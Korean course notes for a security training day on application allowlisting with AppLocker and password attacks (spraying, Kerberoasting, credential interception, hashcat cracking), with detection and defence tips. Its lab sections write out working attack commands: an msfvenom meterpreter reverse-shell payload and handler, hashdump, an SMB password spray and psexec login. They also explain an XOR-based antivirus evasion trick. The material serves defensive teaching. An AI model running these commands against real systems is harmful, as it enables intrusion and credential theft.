---
title: "Day 1 — 허용 목록과 패스워드 공격"
tags:
  - training
  - antisyphon
  - application-allowlisting
  - passwords
---

# Day 1 — 허용 목록과 패스워드 공격 { #day-1 }

<div class="dfir-meta" markdown>
**과정:** Information Security Core Skills · **강사:** John Strand (BHIS) · **1일차 범위:** 컴플라이언스 → 애플리케이션 허용 목록 → 패스워드 공격 → 크래킹
</div>

!!! abstract "1일차 한눈에"
    공격자는 크게 두 길로 들어옵니다 — **① 악성 코드를 실행**하거나 **② 패스워드를 얻어서**. 그래서 1일차는 두 가지를 다룹니다. (1) **애플리케이션 허용 목록**으로 "허용된 폴더에서만 실행"을 강제해 초기 코드 실행을 막는 법(AppLocker 실습), (2) 패스워드가 **스프레이·커버로스팅·네트워크 가로채기·오프라인 크래킹**으로 어떻게 뚫리는지와 방어책. 바탕 원리로는 백신이 왜 뚫리는지(고스트 라이팅·LOLBins)도 봅니다.

!!! note "표기 규칙"
    **💡 보충 (강의 외)** = 강의에 없던 제 추가 설명. **(재구성)** = 강사가 화면으로만 보여 주고 소리 내어 읽지 않아 제가 일반적인 형태로 복원한 명령어이므로, 실제 실습 안내문의 파일명·경로에 맞춰 쓰세요.

---

## 1. 컴플라이언스: 여러 프레임워크를 효율적으로 맞추기 { #compliance }

보안 규정(컴플라이언스) 프레임워크는 아주 많습니다 — SOC 2, HIPAA, NIST 800-53, NIST 800-171, CMMC, 뉴질랜드 NZISM 등. 많은 조직이 이 중 **여러 개를 동시에** 맞춰야 하는데, 프레임워크마다 따로 증빙 문서를 만들고 서로 대조하는 데 시간과 비용이 크게 듭니다.

John의 해결책은 **CIS(Center for Internet Security) Controls에 먼저 맞추고, 나머지는 자동으로 매핑**하는 것입니다. 이때 쓰는 도구가 **CIS Navigator**입니다.

!!! example "예시 — CIS 2.1 하나가 여러 NIST 항목을 커버"
    **CIS 2.1 (소프트웨어 인벤토리 유지):** 모든 설치 소프트웨어의 이름·게시자·최초 사용일 등을 기록. CIS Navigator에서 NIST를 선택하면 이 항목 하나가 아래와 연결됩니다.

    | 프레임워크 | 매핑되는 항목 |
    |---|---|
    | NIST CSF | ID.AM-2 |
    | NIST 800-171 | 3.4.10 |
    | NIST 800-53 | CM-7, CM-8, MA-3 |

    즉 **CIS 2.1 하나를 충족하면 위 NIST 항목도 충족**한 셈입니다. John은 이를 여러 프레임워크를 서로 번역해 주는 <strong>"로제타 스톤"</strong>에 비유했습니다.

CIS Navigator는 이 매핑을 **엑셀로 내보내기** 할 수 있습니다. 충족한 CIS 항목에 `X`를 표시해 두면 다른 프레임워크 기준의 충족 상태도 한눈에 보입니다.

**AI 활용 두 가지**

1. **증빙 문서 + 갭 분석** — 엑셀을 AI에 넣고 "우리는 이 CIS 항목들을 충족한다, NIST CSF 준수 문서를 만들어 달라"고 요청하면 문서를 만들고 부족한 부분도 짚어 줍니다.
2. **공격 기법과 연결** — "우리가 CIS 통제를 적용한 방식 덕분에 어떤 공격 기법을 무력화했는가?"로 물어, **"규정을 지켰다"를 "어떤 공격을 막는다"로 번역**. 이런 매핑을 처음 체계적으로 한 곳으로 John은 **AuditScripts**를 언급했습니다.

!!! note "💡 보충 (강의 외)"
    현재 CIS Controls v8은 18개 컨트롤이며 조직 수준에 따라 IG1(기본)~IG3(고급)으로 나뉩니다. AI에 컴플라이언스 자료를 넣을 때는 내부 정보가 외부로 나가지 않는지 회사 정책을 먼저 확인하고, AI가 만든 매핑은 원본과 반드시 대조하세요. 관련: [Windows 이벤트 ID](../../../basics/windows-event-ids.md) 등 바탕 레퍼런스.

---

## 2. 애플리케이션 허용 목록의 개념 { #allowlisting-concept }

**애플리케이션 허용 목록**은 컴퓨터에서 **실행될 수 있는 프로그램을 제한**하는 것입니다. 실행 범위를 좁히면 공격자가 들어올 길도 좁아집니다. 많은 사람이 "회사의 모든 프로그램을 하나하나 등록해야 한다"고 생각해 두려워하지만, 그럴 필요는 없습니다(방법은 [3장](#allowlisting-how)).

### 차단 목록(Deny List)은 왜 안 되는가 { #why-denylist-fails }

허용 목록의 반대는 **차단 목록**("나쁜 것 목록만 막기") — 전통적 백신(AV)의 방식입니다. 보안 전문가 <strong>마커스 래넘(Marcus Ranum)</strong>은 「컴퓨터 보안의 가장 멍청한 6가지 아이디어」에서 "나쁜 것을 하나하나 나열하기(enumerating badness)"를 꼽았습니다. 이유는 둘 — ① 나쁜 프로그램은 좋은 프로그램보다 훨씬 빨리 나오고, ② 나쁜 코드가 좋은 프로그램 안에 숨어들 수도 있습니다.

John의 비유: 원시인은 "노란 줄무늬 보라색 버섯을 먹으면 죽는다"처럼 **위험 목록**을 이야기로 전했고, 그 방식이 통한 건 **위협이 변하지 않았기** 때문입니다. 하지만 사이버에서는 **오늘 독버섯이 내일은 맛있는 스테이크로 변신**합니다. 위협이 계속 변하므로 차단 목록식 사고는 통하지 않습니다.

### 공격의 현실: 시작은 쉽고, 그다음이 어렵다 { #initial-execution }

John의 경험상 <strong>처음 코드를 실행하는 것(Initial Code Execution)</strong>은 지금도 비교적 쉽습니다. 오히려 그다음 — 권한 상승, 다른 PC로의 횡적 이동 — 을 요즘 보안 제품이 잘 탐지합니다. 그래서 **첫 실행 단계 자체를 막는 것**이 허용 목록의 핵심 역할입니다.

---

## 3. 백신은 어떻게 우회되는가 (원리) { #av-bypass }

John은 "백신 하나에 모든 것을 걸지 말라"는 점을 보이려고 우회 **원리**를 설명합니다(우회 방법을 가르치는 게 목적이 아님). 그래서 이 과정의 실습은 **백신을 꺼 놓고** 진행합니다 — 악성 코드 실행 과정과 그것을 막는 허용 목록의 효과를 관찰하기 위해서입니다.

### 3-1. 고스트 라이팅 (Ghostwriting) { #ghostwriting }

**배경 — AI 백신은 어셈블리 패턴을 본다.** 어셈블리어는 0과 1 바로 한 단계 위의 언어입니다. 모든 함수는 비슷하게 시작(프롤로그)하고 끝(에필로그)납니다.

```asm
push ebp          ; 이전 함수의 기준 위치 저장  ┐
mov  ebp, esp     ; 현재 위치를 새 기준으로      ├ 프롤로그
sub  esp, 0x40    ; 지역 변수 공간 확보          ┘
...               ; 함수 본문
pop  ebp          ; 기준 위치 복원               ┐ 에필로그
ret               ; 원래 위치로 복귀             ┘
```

AI 기반 백신/취약점 도구는 이 시작·끝으로 코드를 **함수 단위로 묶은 뒤** 그 안에 위험 패턴(예: 원래부터 취약한 `gets` 함수, 또는 "메모리를 읽기·쓰기·실행 가능 상태로 잡고 거기에 코드를 넣어 실행"하는 패턴)이 있는지 검사합니다.

!!! note "💡 보충 (강의 외) — 읽기·쓰기·실행(RWX) 메모리"
    정상 코드 영역은 보통 "읽기+실행", 데이터 영역은 "읽기+쓰기"입니다. 셋 다 가능한 영역은 드물어 **인젝션된 코드의 단서**가 됩니다. John이 "나중에 다시 나온다"고 한 이 개념은 메모리 포렌식에서 핵심입니다 — [프로세스 인젝션 탐지](../../../adversary/process-injection.md), [메모리: 프로세스·인젝션](../../../memory/processes-injection.md)(Volatility `malfind`).

**핵심 아이디어 — 같은 결과를 다른 방법으로.** John의 질문: "2와 2로, 더하기 없이 4를 만들려면?" → `2 × 2 = 4`, `2 − (−2) = 4`. 결과는 같아도 이진수로 처리되는 방식은 다릅니다. 어셈블리도 **같은 일을 하는 방법이 여러 가지**라서, 명령을 바꿔 써 백신이 찾는 패턴을 흐트러뜨릴 수 있습니다.

**도구는 XOR.** XOR 규칙은 간단합니다 — 위아래 비트가 **같으면 0, 다르면 1**.

```text
  1 0 1 0
⊕ 1 1 0 0
---------
  0 1 1 0      (1·1→0, 0·1→1, 1·0→1, 0·0→0)
```

어떤 값이든 **자기 자신과 XOR하면 항상 0**이 됩니다(모든 비트가 같으므로). 그래서 `xor edx, edx`는 레지스터를 0으로 초기화하는 흔한 명령입니다. 공격자의 착안: **어차피 0이 될 거라면 그 직전에 무슨 짓을 해도 결과는 같다.**

```asm
add edx, 1       ; 쓸모없는 명령
sub edx, -5      ; 이것도 쓸모없음 (−5를 빼기 = 5를 더하기)
xor edx, edx     ; 결국 0 → 프로그램 동작은 그대로
```

이 변형을 실행 파일 전체에 적용하면 동작은 똑같지만 AI 백신이 외운 "깔끔한 패턴"과 모양이 달라져 탐지를 피합니다. **어셈블리를 깊이 몰라도** XOR처럼 결과가 확실한 명령만 찾아 앞에 쓰레기 명령을 끼우면 됩니다.

**왜 AI가 이런 변형에 약한가?** AI는 **사람이 쓴 코드**로 학습했습니다. 그래서 정상/비정상의 기준이 "사람이 보통 쓰는 코드 모양"입니다. 대량의 코드를 빠르게 검사해야 하는 환경에서 일부러 꼬아 놓은 코드는 **판단 단서(context cue)를 잃게** 만듭니다.

### 3-2. LOLBins (Living Off the Land Binaries) { #lolbins }

"그 땅에서 나는 것으로 산다" — **Windows에 원래 있는 정상 프로그램**으로 악성 코드를 실행하는 기법입니다. 예: `rundll32.exe`로 인터넷의 ActiveX 컨트롤을 받아 실행, Windows 스크립트 호스트로 스크립트 실행. Microsoft 서명이라 의심을 덜 받습니다. 하지만 LOLBins도 **초기 코드 실행(발판)이 있어야** 쓸 수 있습니다 → 그래서 첫 실행을 막는 게 중요합니다. 자세히: [LOLBins](../../../adversary/lolbins.md).

### 3-3. 인코더와 자동화 { #encoders }

- **Shikata Ga Nai** — Metasploit 인코더. 익스플로잇을 망가뜨리는 **나쁜 문자(bad characters)**(예: 문자열 끝으로 인식되는 `\x00`)를 피하면서 코드 모양을 바꿉니다.
- **Unicorn** — 이런 우회 과정을 쉽게 자동화.

!!! quote ""
    오늘 통한 우회가 내일은 안 통할 수 있다. 백신 우회는 과학이라기보다 예술에 가깝다. — 그래서 방어자는 백신이 언젠가 뚫린다고 **가정**하고, 실행 자체를 제한하는 허용 목록 같은 추가 계층을 둬야 한다.

### 학습 도구 — Back Doors & Breaches { #bdb }

BHIS의 카드 게임 [backdoorsandbreaches.com](https://www.backdoorsandbreaches.com/). 과정의 거의 모든 기법이 카드로 있고, 카드 뒷면에 **탐지하는 공격 목록·방어 도구·실습(Lab) 링크**가 있습니다. 예: "엔드포인트 보안 분석" 카드에 AppLocker, Atomic Red Team, Caldera 실습 연결. 실습은 200개가 넘고 브라우저 대전도 가능합니다.

---

## 4. 허용 목록을 적용하는 방법 { #allowlisting-how }

| 방법 | 내용 | 적합한 곳 |
|---|---|---|
| ① 모든 실행 파일 등록 | 가장 철저하나 유지가 어려움 | 키오스크·POS·VDI 등 용도가 고정된 시스템만 |
| ② 디지털 서명(게시자) 기반 | "이 게시자가 서명한 프로그램만 허용" | 신뢰하는 소프트웨어 회사 지정 |
| ③ **경로(폴더) 기반** ⭐ | "이 폴더에서만 실행 가능" | John 추천 출발점 — 일반 업무 PC |

악성 코드가 **주로 처음 실행되는 곳**은 다운로드 폴더·바탕화면·임시 인터넷 파일 폴더입니다. 여기서의 실행만 막아도 초기 코드 실행의 대부분을 차단합니다.

### AppLocker { #applocker }

Windows 내장 도구. 경로·해시·인증서·게시자 기준으로 실행을 제한합니다. <strong>기본 규칙(Default Rules)</strong>은 세 가지입니다.

1. `Program Files` 폴더 안 → 실행 가능
2. `Windows` 폴더 안 → 실행 가능
3. **관리자(Administrators)** → 무엇이든 실행 가능 (문제 시 복구할 **생명줄**)

그 밖(다운로드·바탕화면·C 루트 등)에서는 실행이 막힙니다.

!!! note "💡 보충 (강의 외)"
    **왜 경로 규칙이 통할까:** 일반 사용자는 `Program Files`·`Windows`에 보통 **쓰기 권한이 없어** 공격자가 거기에 악성 코드를 넣기 어렵습니다. 반대로 사용자가 쓸 수 있는 하위 폴더(예: `C:\Windows\Temp`)는 우회 통로가 될 수 있어, 실무에선 이런 예외 경로를 따로 막습니다. **최신 동향:** Microsoft는 이제 AppLocker보다 후속 기술인 <strong>App Control for Business(옛 WDAC)</strong>를 권장합니다(AppLocker는 유지되지만 새 기능 없음). 개념은 같으니 AppLocker로 원리를 익히면 됩니다.

---

## 5. AppLocker 실습 { #applocker-lab }

실습 흐름: **① 피해자 PC를 악성 코드로 감염 → ② AppLocker로 그 실행을 차단.** 감염을 직접 해 봐야 무엇을 막는지 와닿습니다.

!!! warning "실습 전제 — 실무에서는 하지 마세요"
    이 실습은 Windows VM에서 **백신·방화벽을 끄고** 관리자 패스워드를 쉬운 값으로 바꿉니다. 클라우드 랩(MetaCTF, 브라우저 RDP/Guacamole)에서 진행하며, Windows VM에서는 **브라우저 새로고침 금지**(관리자 비밀번호를 바꾼 뒤 새로고침하면 Guacamole이 옛 비번으로 재로그인하려다 실패 → VM을 Destroy 후 재시작). 쓰지 않을 때는 **Destroy Lab**으로 크레딧을 아끼세요.

=== "① 피해자 하드디스크 연결 (Kali)"

    ```bash
    sudo su -
    # 피해자 C 드라이브를 내 폴더처럼 연결 (C$ = Windows 관리자용 숨은 공유)
    mount //10.10.107.229/C$ /mnt/windows_share
    cd /mnt/windows_share
    ```

    - `sudo su -` — root 권한. Metasploit은 raw 소켓/포트를 다뤄 root가 필요합니다.
    - `mount //<피해자IP>/C$ ...` — 원격 C 드라이브를 로컬 폴더처럼 연결. 여기에 파일을 넣으면 곧바로 피해자 PC에 들어갑니다.

=== "② 악성 코드 생성 (msfvenom)"

    ```bash
    # (재구성)
    msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.4.127 -f exe -o trustme.exe
    ```

    - `-p windows/meterpreter/reverse_tcp` — 페이로드. `meterpreter`=원격 조종 도구, `reverse_tcp`=**피해자가 공격자에게 먼저 연결**(방화벽은 보통 안→밖 연결은 허용).
    - `LHOST=10.10.4.127` — 연결을 받을 **공격자** 주소(Listening Host).
    - `-f exe` — Windows 실행 파일 형식, `-o trustme.exe` — 출력 파일명(신뢰감 있는 이름으로 속임).

    !!! note "💡 보충 — 스테이저와 스테이지"
        이 파일은 수백 바이트로 아주 작습니다. 이 작은 조각이 **스테이저**로, 실행되면 공격자 서버에서 진짜 본체인 **스테이지**를 내려받습니다. `trustme.exe`는 본체가 아니라 "본체를 불러오는 심부름꾼"입니다.

=== "③ 연결 대기 (핸들러)"

    ```text
    msfconsole -q                                  # -q: 배너 생략(조용히)
    use exploit/multi/handler                       # 들어오는 역연결을 받는 범용 모듈
    set payload windows/meterpreter/reverse_tcp     # ②와 똑같이 맞춰야 함
    set LHOST eth0                                   # 연결 받을 내 네트워크 카드
    exploit                                          # 지금은 공격이 아니라 '대기' 상태
    ```

    피해자가 `trustme.exe`를 실행하면 그때 연결이 들어옵니다(예: 444 포트 대기).

=== "④ 장악 확인"

    ```text
    meterpreter >            # 이 프롬프트가 뜨면 피해자 PC 완전 장악
    meterpreter > hashdump   # 저장된 모든 계정의 패스워드 해시 추출
    ```

    공격자가 꼭 공유 폴더로 파일을 올리는 건 아닙니다 — 워드·ISO·엑셀에 숨겨 보내기도 합니다. 하지만 **초기 실행은 거의 항상 다운로드·바탕화면·임시 폴더**에서 일어납니다. 이 지점을 막는 것이 다음 단계입니다.

### 차단 설정 { #applocker-enforce }

로컬 보안 정책 → **애플리케이션 제어 정책 → AppLocker → 실행 규칙**에서:

1. 오른쪽 클릭 → **기본 규칙 만들기(Create Default Rules)** (앞서 본 3개 규칙 자동 생성)
2. **규칙 적용(Configure Rule Enforcement)** → "적용(Enforce)"
3. **서비스(services.msc) → Application Identity → 시작(Start)** — 이 서비스가 켜져야 AppLocker가 작동
4. 명령 프롬프트에서 정책 즉시 반영:

```cmd
gpupdate /force
```

이제 `Introlabs` 폴더의 netcat(`nc.exe`)처럼 허용 폴더 밖 프로그램을 실행하면 차단됩니다.

> This program is blocked by Group Policy. For more information, contact your system administrator.

!!! warning "자동 생성 규칙(Automatically Generate Rules)은 쓰지 마세요"
    이 기능은 `Program Files` 안 **모든 프로그램을 해시로 등록**합니다. 매우 철저하지만 **패치·업데이트로 해시가 바뀌면** 그 프로그램이 실행되지 않습니다. 일반 사용자 PC에서는 여러 가지가 망가지므로, 완전히 잠그는 **키오스크 시스템에만** 적합합니다. 결론은 **"어떤 위협 모델에, 어떤 사용 사례인가"를 먼저 정하는 것**.

### 특정 프로그램 예외 허용 (게시자 기반) { #applocker-publisher }

다운로드 폴더에서 꼭 실행해야 하는 프로그램이 있다면 예외를 만듭니다(예: PuTTY). 실행 규칙 → **새 규칙 만들기** → 조건 **게시자(Publisher)** → PuTTY 지정 → "영국 케임브리지 Simon Tatham이 서명한 PuTTY는 모든 버전 허용". 그러면 PuTTY는 **어느 폴더에서든** 실행됩니다.

---

## 6. 패스워드 스프레이 { #password-spray }

| 구분 | 방식 | 결과 |
|---|---|---|
| 패스워드 **게싱**(Guessing) | 한 계정에 여러 비번 | **계정 잠금**으로 쉽게 막힘 |
| 패스워드 **스프레이**(Spraying) | 여러 계정에 **같은 비번 하나** | 각 계정은 1~2회만 틀려 **잠금을 회피** |

공격자는 먼저 직원 목록(사용자 ID)을 수집하고, **계절+연도**(`Winter2025`)나 **지역 스포츠팀+숫자** 같은 비번을 모든 계정에 뿌립니다. **큰 조직일수록 더 위험** — 사용자가 1만 명이면 그중 누군가는 반드시 단순한 비번을 씁니다. John은 "이런 비번으로 약 80%의 조직에 들어간다"고 했습니다.

이 기법(MITRE ATT&CK **T1110.003**)은 John이 직접 MITRE에 요청해 추가시켰습니다. 처음엔 "펜테스터 기법은 안 넣는다"고 거절당했지만, BHIS가 국가 단위 공격자들이 실제로 쓰는 사례(FBI 관련 건, 대학 등)를 제시해 등재되었습니다.

!!! note "💡 보충 (DFIR 관점) — 로그에 남는 모양"
    패스워드 스프레이는 Windows 보안 로그에서 <strong>이벤트 ID 4625(로그온 실패)</strong>가 **짧은 시간에 여러 계정에 걸쳐 각 1~2회씩** 발생하는, **가로로 퍼지는** 패턴입니다(게싱=한 계정 반복 실패와 대비). 성공하면 그 계정에 <strong>4624(로그온 성공)</strong>가 뒤따르고, SMB 경로면 로그온 유형 <strong>3(네트워크)</strong>입니다. 이벤트 ID 전반은 [Windows 이벤트 ID](../../../basics/windows-event-ids.md).

### 실습 { #spray-lab }

=== "① 준비 (Windows / Kali)"

    - Windows(피해자): 백신·방화벽 끄고, `Introlabs`에서 **계정 200개 생성 배치 스크립트** 실행(직원 목록 확보 상황 모사), 이벤트 뷰어 보안 로그 비우기(Clear Log — 실습용).
    - Kali(공격자):
    ```bash
    sudo su -
    wget http://.../users.txt      # (재구성) 수집한 사용자 ID 목록
    ```

=== "② 스프레이 (Metasploit)"

    ```text
    use auxiliary/scanner/smb/smb_login   # 익스플로잇이 아니라 SMB 로그인 시도 스캐너
    set RHOSTS 10.10.124.137              # 공격 대상(피해자) IP  ※ 공격자는 LHOST, 대상은 RHOSTS
    set USER_FILE users.txt               # 시도할 사용자 ID 목록(계정 200개)
    set SMBPass Winter2025                # 모든 계정에 뿌릴 '단 하나의' 비번 ← 스프레이의 핵심
    run
    ```

    실패가 주르륵 올라가다 **초록색 줄**이 성공입니다:

    ```text
    [+] 10.10.124.137 - Success: 'Dennis:Winter2025'
    ```

=== "③ 얻은 자격증명으로 침투"

    ```text
    use exploit/windows/smb/psexec        # 유효한 계정/비번으로 원격 Windows에 명령 실행
    set payload windows/meterpreter/reverse_tcp
    set SMBUser Dennis
    set SMBPass Winter2025                 # 스프레이로 알아낸 Dennis의 비번
    set RHOSTS 10.10.124.137
    exploit                                # 성공하면 meterpreter 세션
    ```

    복잡한 익스플로잇 없이 **약한 비번 하나**로 실제 침투 성공. SMB/PsExec 상세: [PsExec와 SMB](../../../adversary/psexec-smb.md).

### MFA가 있어도 완전하지 않은 이유 { #mfa-gap }

MFA가 있으면 위험이 줄지만 0은 아닙니다. 많은 조직에 MFA가 적용되지 않은 **숨은 API/서비스**가 있고, 공격자는 **조건부 액세스 정책**의 예외로 빠진 곳을 찾아 스프레이합니다.

!!! note "💡 보충 (강의 외)"
    대표적 틈이 **레거시 인증**입니다 — 옛 메일 프로토콜(IMAP/POP3/SMTP 인증)은 MFA를 지원하지 않아, Microsoft는 레거시 인증 차단을 권장합니다.

---

## 7. 패스워드에서 가장 중요한 것: 길이 { #password-length }

John은 <strong>"가장 중요한 것은 길이"</strong>라고 단언합니다. 한 글자 늘릴 때마다 공격자가 깨야 할 조합이 **두 배보다 조금 더** 늘어납니다 — 5자 요구면 5자짜리 전부만, 6자 요구면 5자+6자짜리 전부를 깨야 하기 때문입니다.

!!! note "💡 보충 (강의 외)"
    더 정확히는 한 글자마다 **쓸 수 있는 문자 종류만큼 곱해집니다** — 숫자만(10가지)이면 10배, 영문 대소문자+숫자+특수문자(약 95가지)면 약 95배. John의 핵심("길이가 결정적")은 그대로 맞습니다.

**1985년 기준이 아직 남아 있다.** John은 미 국방부의 1985년 패스워드 지침 <strong>그린북(Green Book)</strong>을 보여 줍니다 — 당시엔 "공격자가 1분에 8.5번 추측"(300bps 모뎀)을 기준으로 변경 주기를 계산했습니다. 오늘날 GPU는 **1초에 수십억 번**이라, 그 논리를 그대로 적용하면 "1초마다 바꿔야 한다"는 농담이 됩니다. 그런데도 신용카드 표준 **PCI DSS**조차 몇 년 전까지 최소 길이가 **7자**였습니다.

!!! note "💡 보충 (강의 외)"
    PCI DSS 4.0부터 최소 12자로 늘었고 2025년부터 의무화되었습니다. 최신 NIST 지침은 "주기적 강제 변경을 없애고, 길이를 늘리고, 유출 비번 목록과 대조하라"로 1985년과 정반대입니다.

**현실적 걸림돌:** 오래된 Solaris SPARC·메인프레임(RACF)은 9자 이상을 처리 못 하기도 합니다 — 게으름이 아니라 사실인 경우가 많습니다.

**SMS 인증은 쓸모없을까?** **SIM 스와핑**에 약한 건 맞지만, **위협 모델**을 먼저 보라고 합니다. 국가 단위 표적이 아니라면(일반 간호사·회계사 등) 노력 대비 가능성이 낮으므로, **SMS도 없는 것보다 훨씬 낫습니다**(가능하면 인증 앱·FIDO2가 더 좋음).

---

## 8. 서비스 계정과 커버로스팅 { #kerberoasting }

**서비스 계정**(사람이 아니라 SQL·백업 등 프로그램이 쓰는 계정)은 흔히 권한이 높고, 계정 잠금이 없고, 비번이 만료되지 않고, 보안팀이 잘 안 봅니다 — John의 표현으로 **"보안팀은 잊고, 해커는 사랑하는"** 계정입니다.

**커버로스팅(Kerberoasting)** 원리(Red Siege의 Tim Medin이 발견):

1. AD의 **아무 일반 사용자**나 서비스 티켓을 요청할 수 있다.
2. 도메인 컨트롤러는 그 티켓을 **서비스 계정의 비번으로 암호화**해 내준다.
3. 공격자는 티켓을 가져가 **자기 컴퓨터에서 오프라인으로 크랙**한다.

핵심은 3단계가 **오프라인**이라는 점 — 서버에 로그인 시도를 반복하지 않으니 **계정 잠금도, 로그온 실패 기록도 없습니다**. 비번이 짧거나 단순하면 금방 뚫립니다.

!!! note "💡 보충 (DFIR 관점)"
    커버로스팅은 DC의 <strong>이벤트 ID 4769(Kerberos 서비스 티켓 요청)</strong>로 탐지합니다 — 특히 암호화 유형 **0x17(RC4)** 티켓이 한 사용자에게서 여러 서비스로 몰리면 신호. 방어는 서비스 계정에 **25자 이상 긴 비번** 또는 자동 교체되는 **gMSA**, 가능하면 AES 강제. 전체 탐지 쿼리와 흔적은 <strong>[Kerberoasting 레퍼런스](../../../adversary/kerberoasting.md)</strong>에 정리되어 있습니다.

---

## 9. 네트워크에서 인증 정보 가로채기 { #network-cred-theft }

같은 네트워크에 공격자가 있으면 피해자 PC를 속여 **인증 정보를 공격자에게 보내게** 만들 수 있습니다. 관련 프로토콜: **LLMNR, NBT-NS, mDNS**(Windows가 DNS로 이름을 못 찾을 때 "이 이름 누구예요?"라고 네트워크 전체에 외치는 방식), **WPAD**(브라우저 프록시 자동 탐색).

사용자가 서버 이름을 오타로 치면 PC가 네트워크에 외치고, 공격자가 <strong>"저예요!"</strong>라고 거짓 응답 → 피해자 PC가 공격자를 진짜 서버로 믿고 자동 인증 → 공격자가 **패스워드 해시**를 챙깁니다. 이를 자동화하는 도구가 **Responder**(웹·SMB·Kerberos·SQL·FTP·IMAP·POP·SMTP·DNS 가짜 서버). 흔히 **ARP 캐시 포이즈닝**과 함께 쓰입니다.

!!! note "💡 보충 (강의 외)"
    방어는 그룹 정책으로 **LLMNR·NBT-NS 끄기**(대부분 업무 영향 없음)와 **SMB 서명 강제**(가로챈 인증을 넘겨 쓰는 **릴레이 공격** 차단). 전체 흔적·탐지: **[LLMNR과 NTLM 릴레이](../../../adversary/llmnr-ntlm-relay.md)**.

**그 밖의 도구:** **CredKing**(AWS Lambda로 요청마다 IP를 바꿔 "같은 IP 실패 多" 차단 회피), **Evilginx**(진짜 로그인 페이지와 사용자 사이에 끼는 중간자(AiTM) 피싱).

!!! note "💡 보충 (강의 외)"
    Evilginx 같은 AiTM은 사용자가 MFA까지 정상 통과하게 한 뒤 **세션 쿠키를 훔쳐** MFA를 우회합니다. 일반 MFA로는 막기 어렵고 **FIDO2/패스키**(진짜 사이트 주소에만 반응하는 피싱 저항형 MFA)로 막습니다.

---

## 10. 패스워드 매니저와 PAM { #pwmgr-pam }

**패스워드 매니저**는 적극 추천하되 신뢰할 수 있는 제품을 고르라고 합니다. **LastPass** 사건에서 일부 데이터가 **AES ECB 모드**로 암호화된 사실이 드러났는데, ECB는 **같은 내용이 항상 같은 암호문**이 되어 내용을 몰라도 "어떤 항목이 같은 값을 쓰는지" 패턴이 보입니다(= **비번 재사용**이 드러남).

<strong>PAM(특권 계정 관리)</strong>은 관리자 계정 비번을 **자동으로 계속 교체**하고 사용할 때마다 "체크아웃"하게 합니다(Microsoft **LAPS**는 PC마다 로컬 관리자 비번을 자동으로 다르게). John의 우려는 이런 제품이 클라우드로 가며 **단일 장애점**이 되는 것 — 금고 하나가 털리면 끝입니다.

!!! note "💡 보충 (강의 외)"
    John이 언급한 "원격 지원 업체 침해로 정부 기관이 뚫린" 사건은 2024년 말 **BeyondTrust** 침해로 그 키를 통해 **미국 재무부**가 뚫린 사건으로 알려져 있습니다.

---

## 11. 패스워드 크래킹 실습 { #cracking-lab }

**왜 GPU가 크래킹에 강한가:** 그래픽은 똑같은 수학 계산을 엄청나게 반복하는 일이라, 빠른 CPU 하나보다 **작은 계산기 수천 개가 동시에** 일하는 GPU가 유리합니다. 같은 구조가 잘 맞는 다른 일이 **비트코인 채굴·패스워드 크래킹·AI 학습**(모두 같은 계산의 대량 반복)입니다. **Hashcat**이 이 GPU 힘을 크래킹에 씁니다.

!!! note "💡 보충 (강의 외) — 해시와 크래킹"
    시스템은 비번을 그대로 저장하지 않고 **해시**(되돌릴 수 없는 변환)로 저장합니다. 그래서 크래킹은 <strong>"후보 단어를 해시로 바꿔 훔친 해시와 같은지 비교"</strong>하는 방식 — 같으면 그 단어가 비번입니다.

=== "① 준비"

    ```bash
    sudo su -
    rm ~/.local/share/hashcat/hashcat.potfile   # (재구성) 경로는 실습 안내문 기준
    cd /opt/password_cracking
    ```

    - **팟 파일(potfile)** = Hashcat이 **이미 푼 비번을 기록**해 두는 파일. 남아 있으면 이번 실습에서 아무것도 안 하고 끝나므로 지웁니다.

=== "② MD5 해시"

    ```bash
    # (재구성) 파일명은 실습 안내문에 맞추세요
    hashcat -m 0 -a 0 md5_hashes.txt wordlist.txt
    ```

    - `-m 0` = 해시 종류(mode) **0번 = MD5**(웹/DB에서 흔함), `-a 0` = **사전 공격**(단어 목록 대입).

    결과는 `해시값:비번` 형식:

    ```text
    5f4dcc3b...:password
    ...:peanuts
    ...:swordfish
    Status....: Cracked
    Recovered.: 6/6 (100.00%)
    ```

=== "③ Windows NT(NTLM) 해시"

    ```bash
    # (재구성)
    hashcat -m 1000 -a 0 sam_hashes.txt wordlist.txt
    hashcat -m 1000 sam_hashes.txt --show      # 다시 안 돌리고 저장된 결과만 보기
    ```

    - `-m 1000` = **NTLM 해시**(Windows 사용자 비번 저장 방식). 앞 실습의 `hashdump`로 뽑은 해시가 이 종류.

    ```text
    ...:freedom
    31d6cfe0d16ae931b73c59d7e0c089c0:     ← 오른쪽이 비면 '빈 패스워드'
    ...:8675309
    ```

    !!! note "💡 보충 (강의 외) — NT 해시의 약점"
        NT 해시는 비번을 UTF-16LE로 바꾼 뒤 **MD4**로 해시한 값입니다. 가장 큰 약점은 **솔트(해시 전에 섞는 무작위 값)가 없다**는 것 — 같은 비번은 어느 PC에서든 같은 해시라, 미리 계산한 표로 공격하기 쉽고 해시만으로 로그인하는 <strong>[Pass-the-Hash](../../../adversary/pass-the-hash.md)</strong>도 가능해집니다. `31d6cfe0d16ae931b73c59d7e0c089c0`은 "빈 비번"의 유명한 NTLM 해시이니 DFIR에서 바로 알아보면 좋습니다. `hashdump`로 해시를 뽑는 쪽: [SAM과 NTDS 추출](../../../adversary/sam-ntds-extraction.md).

John은 BHIS의 **Hashcat 치트시트**(해시 모드 번호·옵션 정리)도 추천했습니다.

---

## 12. 질의응답(AMA)에서 나온 핵심 { #ama }

- **InfraGard(FBI-민간 정보 공유 단체)에 가입할까?** → "꼭 가입하고 **발표를 자원하라**." 그 자리에 **채용 결정권자**가 있고, 모임엔 좋은 발표가 늘 부족하다.
- **AI(Anthropic Mythos)와 쏟아지는 취약점?** → 처음엔 마케팅 의심도 있었지만 여러 업체가 이 모델이 **취약점을 대량 발견**했다고 확인. 핵심 메시지: <strong>"패치가 없을 때 어떻게 막을 것인가"</strong>를 생각해야 하는데 업계 대부분이 준비가 안 돼 있다 — **그래서 이 과정이 중요하다**(허용 목록·방화벽·로깅처럼 공격 범주 전체를 막는 통제로 버텨라).
- **AI에게 패치를 맡기는 것?** → 사람 감독 없이 AI에 전부 맡기는 것을 경계.
- **지금 취업: 민간 vs 정부?** → **정부 쪽이 낫다**(향후 ~18개월 업계가 불안정). 많은 회사가 "주니어를 AI로 대체"하며 채용을 멈추는데, John은 이를 실수로 봄 — AI는 **방어보다 공격에 비대칭적으로 유리**하므로 오히려 사람을 뽑아 **AI 활용을 훈련**시켜야 한다.

!!! note "💡 보충 (강의 외)"
